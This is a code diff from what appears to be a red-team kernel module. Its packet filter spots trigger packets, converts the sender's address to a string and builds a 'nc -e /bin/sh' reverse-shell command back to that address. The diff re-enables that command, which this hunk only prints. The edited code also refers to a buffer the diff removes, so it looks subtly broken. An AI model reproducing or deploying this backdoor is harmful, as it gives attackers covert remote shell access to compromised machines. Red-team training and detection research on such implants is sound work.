@@ -94,34 +94,28 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         return PFIL_PASS;
     }
 
+    // Now we know the packet is a red-team packet
 
-    // now we know the packet is a red-team packet
-    // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
-
+    // Create a string of the attacker source IP
+    char attacker_ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
+    snprintf(attacker_ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+        (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
+        (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
+        (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
+        (ntohl(ip_header->ip_src.s_addr)) & 0xFF);
+    
+    printf("Kernel IP Address: %s\n", attacker_ip_str);
 
     // Construct the reverse shell command
-    // char reverse_shell_cmd[100];
-    //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-       // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
+    char reverse_shell_cmd[100];
+    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
+       "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
    
-    //printf("%s\n", reverse_shell_cmd);
+    printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
 
-        char ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
-        // gives IP quartets in reverse order
-        // snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
-        //          (ip_header->ip_src.s_addr >> 24) & 0xFF,
-        //          (ip_header->ip_src.s_addr >> 16) & 0xFF,
-        //          (ip_header->ip_src.s_addr >> 8) & 0xFF,
-        //          (ip_header->ip_src.s_addr) & 0xFF);
-        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
-         (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
-         (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
-         (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
-         (ntohl(ip_header->ip_src.s_addr)) & 0xFF);
-        
-        printf("Kernel IP Address: %s\n", ip_str);
+
 
 
 
